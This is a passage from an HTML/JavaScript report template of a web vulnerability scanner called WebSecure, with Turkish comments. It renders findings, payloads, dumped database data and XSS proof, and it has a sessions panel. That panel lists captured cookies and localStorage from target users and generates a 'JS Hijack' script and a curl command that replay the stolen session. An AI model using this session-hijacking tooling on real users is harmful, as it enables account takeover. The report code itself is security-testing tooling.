            html += `<pre style="background:#0d1117; border:1px solid var(--sev-high); border-radius:4px; padding:10px; font-size:0.88rem; overflow-x:auto; white-space:pre-wrap;">${{escapeHtml(payStr)}}</pre>`;
            html += `</div>`;
        }}

        // --- 4. Reason / Message ---
        const reasonVal = d.reason || d.message || d.description;
        if (reasonVal) {{
            html += `<div style="margin:12px 0;"><div style="font-weight:600; margin-bottom:4px;">📋 Reason</div><p style="color:var(--text-muted); margin:0;">${{escapeHtml(reasonVal)}}</p></div>`;
        }}

        // --- 5. HTTP İstek / Yanıt ---
        const reqVal  = d.request  || d.raw_request  || (typeof d.evidence === 'object' && d.evidence && d.evidence.request);
        const respVal = d.response || d.raw_response || (typeof d.evidence === 'object' && d.evidence && d.evidence.raw_response);
        if (reqVal || respVal) {{
            html += `<div style="margin:12px 0;">`;
            html += `<div style="font-weight:600; margin-bottom:8px;">🌐 HTTP Traffic</div>`;
            if (reqVal) {{
                let rq = typeof reqVal === 'object' ? JSON.stringify(reqVal, null, 2) : String(reqVal);
                if (rq.length > 3000) rq = rq.substring(0, 3000) + "\n... [truncated]";
                html += `<details style="margin-bottom:6px;"><summary style="cursor:pointer; color:var(--accent); font-size:0.88rem;">▶ Request</summary><pre style="font-size:0.8rem; max-height:250px; overflow:auto; margin-top:4px;">${{escapeHtml(rq)}}</pre></details>`;
            }}
            if (respVal) {{
                let rs = typeof respVal === 'object' ? JSON.stringify(respVal, null, 2) : String(respVal);
                if (rs.length > 3000) rs = rs.substring(0, 3000) + "\n... [truncated]";
                html += `<details><summary style="cursor:pointer; color:var(--accent); font-size:0.88rem;">▶ Response</summary><pre style="font-size:0.8rem; max-height:250px; overflow:auto; margin-top:4px;">${{escapeHtml(rs)}}</pre></details>`;
            }}
            html += `</div>`;
        }}

        // --- 6. Evidence Forensics (object tipinde) ---
        const ev = (typeof d.evidence === 'object' && d.evidence && !Array.isArray(d.evidence)) ? d.evidence : {{}};
        const hasEvidence = Object.keys(ev).length > 0;
        if (hasEvidence) {{
            html += `<div style="margin-top:16px; border:1px solid var(--accent); border-radius:6px; overflow:hidden;">`;
            html += `<div style="background:var(--accent); color:#000; padding:8px 12px; font-weight:bold; font-size:0.9rem;">🔎 Evidence Locker</div>`;
            html += `<div style="padding:12px; background:var(--bg-card);">`;
            if (ev.database_banner || ev.dumped_data) {{
                html += `<h4 style="color:var(--sev-high); margin-top:0;">🩸 DB Extraction</h4>`;
                if(ev.database_banner) html += `<div><strong>Banner:</strong> <code>${{escapeHtml(ev.database_banner)}}</code></div>`;
                if(ev.dumped_data && Array.isArray(ev.dumped_data))
                    html += `<pre style="color:var(--sev-high);">${{escapeHtml(ev.dumped_data.join("\\n"))}}</pre>`;
            }}
            if (ev.alert_text || ev.mechanism) {{
                html += `<h4 style="color:var(--sev-critical); margin-top:12px;">📸 XSS Proof</h4>`;
                if(ev.mechanism)  html += `<div><strong>Mechanism:</strong> ${{escapeHtml(ev.mechanism)}}</div>`;
                if(ev.alert_text) html += `<div><strong>Alert:</strong> <code style="background:#000; padding:2px 6px; color:#0f0;">${{escapeHtml(ev.alert_text)}}</code></div>`;
            }}
            if(ev.screenshot_path)
                html += `<div style="margin-top:8px;"><img src="${{escapeHtml(ev.screenshot_path)}}" style="max-width:100%; border:1px solid #555;"></div>`;
            // Remaining evidence keys
            const usedEv = ["database_banner","extracted_data_type","dumped_data","alert_text","mechanism","raw_response","screenshot_path","request","response"];
            const otherEv = Object.keys(ev).filter(k => !usedEv.includes(k));
            if (otherEv.length > 0) {{
                html += `<div style="margin-top:8px; font-size:0.85rem;"><div class="kv-grid">`;
                otherEv.forEach(k => {{
                    let v = ev[k];
                    if (typeof v === 'object') v = JSON.stringify(v, null, 2);
                    html += `<div class="label">${{escapeHtml(k)}}</div><div><pre style="margin:0; padding:4px; font-size:0.82rem;">${{escapeHtml(String(v))}}</pre></div>`;
                }});
                html += `</div></div>`;
            }}
            html += `</div></div>`;
        }}

        // --- 7. Geri kalan alanlar (dump) ---
        const handledKeys = new Set(["url","method","severity","location","param","confidence","score",
            "verified","confirmed","tool","scanner","source","technique","attack_type","attack","vector",
            "category","script","script_name","template","waf_bypass","bypass_technique","encoding",
            "payload","poc","reason","message","description","request","raw_request","response","raw_response","evidence","ts"]);
        const extraKeys = Object.keys(d).filter(k => !handledKeys.has(k) && !k.startsWith("_"));
        if (extraKeys.length > 0) {{
            html += `<details style="margin-top:12px;"><summary style="cursor:pointer; color:var(--text-muted); font-size:0.85rem;">▶ All Raw Fields (${{extraKeys.length}})</summary>`;
            html += `<div class="kv-grid" style="margin-top:8px; font-size:0.83rem;">`;
            extraKeys.forEach(k => {{
                let val = d[k];
                if (typeof val === 'object') val = JSON.stringify(val, null, 2);
                html += `<div class="label">${{escapeHtml(k)}}</div><div><pre style="margin:0; padding:4px;">${{escapeHtml(String(val ?? ''))}}</pre></div>`;
            }});
            html += `</div></details>`;
        }}

        document.getElementById('modalBody').innerHTML = html;
        modal.style.display = 'block';
    }}

    function showSessions() {{
        const modal = document.getElementById('sessionsModal');
        const body = document.getElementById('sessionsBody');

        if (!sessions || sessions.length === 0) {{
            body.innerHTML = `
              <div style="text-align:center; padding:2rem; color:var(--text-muted);">
                <div style="font-size:2rem;">🔒</div>
                <p>Yakalanmış session yok.</p>
                <p style="font-size:0.85rem;">XSS DOM doğrulaması veya credential recovery ile session yakalanabilir.</p>
              </div>`;
        }} else {{
            let html = `<p style="color:var(--sev-critical); font-weight:bold; margin:0 0 1rem;">
              ⚠️ ${{sessions.length}} adet session yakalandı — bunlar hedef kullanıcılara ait oturumlardır.
            </p>`;

            sessions.forEach((s, idx) => {{
                const cookieObj  = s.cookies || {{}};
                const lsObj      = s.local_storage || {{}};
                const ssObj      = s.session_storage || {{}};
                const cookieJson = JSON.stringify(cookieObj);
                const verified   = s.verified || s.ato_verified || false;
                const source     = s.source || 'credential';
                var _srcMap = {{'xss_reflected':'🎯 XSS Reflected','xss_dom':'🎯 XSS DOM','xss_blind':'👁️ XSS Blind (OAST)','credential':'🔑 Credential Recovery'}};
                const sourceLabel = _srcMap[source] || source;

                // Hijack script — DevTools konsoluna yapıştır
                const hijackScript = [
                    `// ═══ WebSecure Session Hijack ═══`,
                    `// Kaynak: ${{source}} | Zaman: ${{s.timestamp || ''}}`,
                    `// XSS URL: ${{s.xss_url || s.origin_url || ''}}`,
                    `(function() {{`,
                    `  var c = ${{cookieJson}};`,
                    `  for (var k in c) document.cookie = k+'='+c[k]+'; path=/; SameSite=Lax';`,
                    `  var ls = ${{JSON.stringify(lsObj)}};`,
                    `  for (var k in ls) localStorage.setItem(k, ls[k]);`,
                    `  console.log('%c[WebSecure] Session injected!', 'color:lime;font-size:14px;font-weight:bold');`,
                    `  setTimeout(() => location.reload(), 800);`,
                    `}})();`,
                ].join('\n');

                // Curl komutu
                const curlCookies = Object.entries(cookieObj).map(([k,v]) => `${{k}}=${{v}}`).join('; ');
                const curlCmd = `curl -s -b '${{curlCookies}}' '${{s.verification_url || s.origin_url || ''}}' -I`;

                const hijackAttr = escapeHtml(hijackScript).replace(/"/g, '&quot;');
                const curlAttr   = escapeHtml(curlCmd).replace(/"/g, '&quot;');

                html += `
                <div style="background:var(--bg-body); border:1px solid ${{verified ? 'var(--sev-critical)' : 'var(--border)'}}; border-radius:8px; padding:1rem; margin-bottom:1rem;">

                  <!-- Header -->
                  <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; flex-wrap:wrap; gap:8px;">
                    <div style="display:flex; align-items:center; gap:10px;">
                      <span style="font-size:1.1rem; font-weight:700; color:var(--sev-critical);">#${{idx+1}}</span>
                      <span style="font-size:0.85rem; color:var(--accent);">${{sourceLabel}}</span>
                      <span class="tag ${{verified ? 'Critical' : 'Info'}}" style="font-size:0.75rem;">
                        ${{verified ? '✅ Doğrulandı (HTTP ' + s.verification_status + ')' : '⚠️ Doğrulanmamış'}}
                      </span>
                    </div>
                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
                      <button class="btn" style="font-size:0.78rem; padding:3px 8px; background:rgba(248,81,73,0.15); border-color:var(--sev-high);"
                        onclick="navigator.clipboard.writeText(this.dataset.cmd).then(()=>{{this.textContent='✅ Kopyalandı!';setTimeout(()=>this.textContent='💉 JS Hijack',1500)}})"
                        data-cmd="${{hijackAttr}}">💉 JS Hijack</button>
                      <button class="btn" style="font-size:0.78rem; padding:3px 8px;"
                        onclick="navigator.clipboard.writeText(this.dataset.cmd).then(()=>{{this.textContent='✅ Kopyalandı!';setTimeout(()=>this.textContent='🖥️ cURL',1500)}})"
                        data-cmd="${{curlAttr}}">🖥️ cURL</button>
                      ${{s.verification_url ? `<a href="${{escapeHtml(s.verification_url)}}" target="_blank" class="btn" style="font-size:0.78rem; padding:3px 8px;">🔗 Test Et</a>` : ''}}
                    </div>
                  </div>

                  <!-- Meta -->
                  <div style="display:grid; grid-template-columns:130px 1fr; gap:4px 12px; font-size:0.83rem; margin-bottom:10px;">
                    <span style="color:var(--text-muted);">Zaman</span><span>${{s.timestamp || '-'}}</span>
                    ${{s.xss_url ? `<span style="color:var(--text-muted);">XSS URL</span><span style="font-family:monospace; font-size:0.78rem; word-break:break-all;">${{escapeHtml(s.xss_url)}}</span>` : ''}}
                    ${{s.xss_param ? `<span style="color:var(--text-muted);">Parametre</span><span><code style="color:var(--sev-high);">${{escapeHtml(s.xss_param)}}</code></span>` : ''}}
                    ${{s.origin_url ? `<span style="color:var(--text-muted);">Origin</span><span style="font-size:0.78rem; word-break:break-all;">${{escapeHtml(s.origin_url)}}</span>` : ''}}
                  </div>

                  <!-- Cookies -->
                  <details open>
                    <summary style="cursor:pointer; color:var(--accent); font-weight:600; font-size:0.85rem; margin-bottom:6px;">
                      🍪 Cookies (${{Object.keys(cookieObj).length}})
                    </summary>
                    <div style="display:flex; flex-wrap:wrap; gap:6px; margin-bottom:6px;">
                      ${{Object.entries(cookieObj).map(([k,v]) =>
                        `<div style="background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:4px; padding:4px 8px; font-size:0.78rem;">
                          <span style="color:var(--sev-medium); font-weight:600;">${{escapeHtml(k)}}</span>
                          <span style="color:var(--text-muted);">=</span>
                          <span style="color:var(--text-main); font-family:monospace; word-break:break-all;">${{escapeHtml(v.length>60?v.substring(0,60)+'…':v)}}</span>
                        </div>`
                      ).join('')}}
                    </div>
                  </details>

                  <!-- localStorage -->
                  ${{Object.keys(lsObj).length ? `
                  <details style="margin-top:6px;">
                    <summary style="cursor:pointer; color:var(--accent); font-weight:600; font-size:0.85rem; margin-bottom:6px;">
                      💾 localStorage (${{Object.keys(lsObj).length}} key)
                    </summary>
                    <pre style="font-size:0.78rem; max-height:120px; overflow:auto;">${{escapeHtml(JSON.stringify(lsObj, null, 2))}}</pre>
                  </details>` : ''}}

                  <!-- Raw cookie string -->
                  ${{s.raw_cookie_str ? `
                  <details style="margin-top:6px;">
                    <summary style="cursor:pointer; color:var(--text-muted); font-size:0.8rem;">▶ Ham Cookie String</summary>
                    <pre style="font-size:0.75rem; color:var(--sev-medium); margin-top:4px; max-height:80px; overflow:auto;">${{escapeHtml(s.raw_cookie_str)}}</pre>
                  </details>` : ''}}

                </div>`;
            }});
            body.innerHTML = html;
        }}

        modal.style.display = 'block';
    }}

    function closeModal(id) {{
        document.getElementById(id || 'detailModal').style.display = 'none';
    }}

    // Close on click outside
    window.onclick = function(event) {{
        if (event.target.classList.contains('modal')) {{
            event.target.style.display = 'none';
        }}
    }}

    function escapeHtml(text) {{
        if (!text) return "";
        return String(text)
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }}

    // Search: both inline oninput attr + addEventListener for belt-and-suspenders
    (function() {{
        var si = document.getElementById('searchInput');
        if (si && !si._wsListenerAdded) {{
            si.addEventListener('input', applyFilters);
            si._wsListenerAdded = true;
        }}
    }})();

    // Init — render full table on load
    try {{
        renderTable(data);
    }} catch(e) {{
        console.error('[WebSecure] Initial renderTable failed:', e);
        var tbody = document.getElementById('tableBody');
        if (tbody) tbody.innerHTML = '<tr><td colspan="6" style="color:var(--sev-high); padding:1rem;">Error rendering findings table. Check console.</td></tr>';
    }}

</script>
</body>
</html>
"""
